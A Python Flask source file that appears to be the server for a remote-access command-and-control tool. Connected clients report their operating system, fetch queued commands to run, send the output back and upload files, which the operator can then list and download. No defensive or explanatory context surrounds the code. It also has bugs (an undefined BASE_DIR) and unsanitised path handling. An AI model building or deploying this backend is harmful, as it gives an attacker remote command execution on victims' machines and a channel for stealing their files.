import os
from flask import Flask, request, render_template, jsonify, send_from_directory
from datetime import datetime

app = Flask(__name__)

# Directory to store client data
CLIENTS_DIR = "clients"
CMDS_DIR = "cmd"
OS_DIR = "os"


# Ensure the directory exists
os.makedirs(CLIENTS_DIR, exist_ok=True)
os.makedirs(CMDS_DIR, exist_ok=True)
os.makedirs(OS_DIR, exist_ok=True)

# Directory to save uploaded files
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


@app.route('/')
def index():
    # Get all client files and extract OS info
    clients = []
    for filename in os.listdir(CLIENTS_DIR):
        if filename.endswith(".txt"):  # Only include client files
            client_id = filename.split(".")[0]
            os_info = get_client_os(client_id)
            clients.append({"id": client_id, "os": os_info})

    return render_template("index.html", clients=clients)

def get_client_os(client_id):
    """Fetch OS info for a client."""
    os_file = os.path.join(OS_DIR, f"{client_id}.txt")
    if os.path.exists(os_file):
        with open(os_file, "r") as f:
            return f.read().strip()
    return "Unknown OS"


@app.route("/clients", methods=["GET"])
def list_clients():
    # List all available clients with "_command.txt" suffix
    clients = [f for f in os.listdir(BASE_DIR) if f.endswith("_command.txt")]
    return render_template("index.html", clients=clients)


@app.route('/client/<client_id>')
def client_interface(client_id):
    """Render the interface for a specific client."""
    client_file = os.path.join(CLIENTS_DIR, f"{client_id}.txt")
    if os.path.exists(client_file):
        with open(client_file, "r") as f:
            output = f.read()
    else:
        output = "No data yet for this client."
    return render_template('client.html', client_id=client_id, output=output)




@app.route('/command/<client_id>', methods=['GET'])
def get_command(client_id):
    """Send the current command to the specified client."""
    command_file = os.path.join(CMDS_DIR, f"{client_id}_command.txt")
    if os.path.exists(command_file):
        with open(command_file, "r") as f:
            command = f.read()
    else:
        command = ""
    if os.path.exists(command_file):
        os.remove(command_file)
    return command


@app.route('/output/<client_id>', methods=['POST'])
def receive_output(client_id):
    """Receive the output from the specified client."""
    output = request.form.get('output', '')
    client_file = os.path.join(CLIENTS_DIR, f"{client_id}.txt")
    with open(client_file, "a") as f:  # Append to the file
        f.write(output + "\n")
    return "Output received", 200


@app.route('/osinfo/<client_id>', methods=['POST'])
def receive_osinfo(client_id):
    """Receive the output from the specified client."""
    output = request.form.get('os', '')
    client_file = os.path.join(OS_DIR, f"{client_id}.txt")
    with open(client_file, "w") as f:  # Write to the file
        f.write(output + "\n")
    return "OS Info received", 200


@app.route('/send/<client_id>', methods=['POST'])
def send_command(client_id):
    """Set a new command for the specified client."""
    command = request.form.get('command', '')
    command_file = os.path.join(CMDS_DIR, f"{client_id}_command.txt")
    with open(command_file, "w") as f:  # Overwrite with the new command
        f.write(command)
    return "Command updated", 200

@app.route('/getoutput/<client_id>', methods=['POST'])
def get_output(client_id):
    """Get output from the specified client."""
    client_file = os.path.join(CLIENTS_DIR, f"{client_id}.txt")
    with open(client_file, "r") as f:  # read file
        output = f.read()
    return output


@app.route('/clear/<client_id>', methods=['POST'])
def clear_data(client_id):
    """Clear the command and output for the specified client."""
    client_file = os.path.join(CLIENTS_DIR, f"{client_id}.txt")
    command_file = os.path.join(CMDS_DIR, f"{client_id}_command.txt")
    if os.path.exists(client_file):
        os.remove(client_file)
    if os.path.exists(command_file):
        os.remove(command_file)
    return "Data cleared", 200


# Endpoint to handle file uploads
@app.route("/upload/<client_id>", methods=["POST"])
def upload_file(client_id):
    if "file" not in request.files:
        return "No file part in the request.", 400

    file = request.files["file"]
    if file.filename == "":
        return "No file selected.", 400
    
    # Save file to the server
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{client_id}_{timestamp}_{file.filename}"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)

    # (Optional) Store metadata in a database
    # For now, we'll just print to the console
    print(f"File saved: {filepath}")

    return "File uploaded successfully.", 200

@app.route("/files/<client_id>", methods=["GET"])
def list_files(client_id):
    files = []
    for filename in os.listdir(UPLOAD_FOLDER):
        if filename.startswith(client_id):
            files.append(filename)
    return jsonify(files)


@app.route("/download/<filename>", methods=["GET"])
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)